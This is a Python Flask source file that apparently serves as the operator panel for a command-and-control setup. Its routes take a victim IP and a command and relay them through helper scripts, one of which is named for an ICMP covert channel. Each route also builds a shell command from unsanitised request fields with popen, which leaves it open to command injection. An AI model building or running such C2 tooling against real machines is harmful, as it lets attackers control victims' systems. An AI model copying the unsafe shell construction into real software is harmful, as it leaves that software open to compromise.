from flask import Flask, render_template, request
from os import popen

app = Flask("__app__")

from pathlib import Path
dirname = Path(__file__).parent.resolve()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/processd", methods=["POST"])
def processd():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    raw = popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py").read()
    print(f"Processd raw: {raw}")
    output = raw.split("\n", 1)[1]
    return output

@app.route("/icmp", methods=["POST"])
def icmp():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    raw = popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}").read()
    print(f"ICMP: {raw}")
    output = raw.split("\n", 1)[1]
    return output

app.run(host="0.0.0.0", port=80)